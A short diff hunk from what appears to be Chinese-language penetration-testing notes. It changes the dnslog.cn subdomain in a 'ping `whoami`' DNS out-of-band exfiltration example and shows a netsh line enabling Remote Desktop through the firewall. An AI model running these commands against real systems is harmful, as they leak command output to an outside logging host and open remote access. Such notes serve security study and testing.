@@ -208,7 +208,7 @@ netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 
 比如linux,
 ```
- ping `whoami`.dqua8k.dnslog.cn
+ ping `whoami`.ag1euc.dnslog.cn
 
 
 
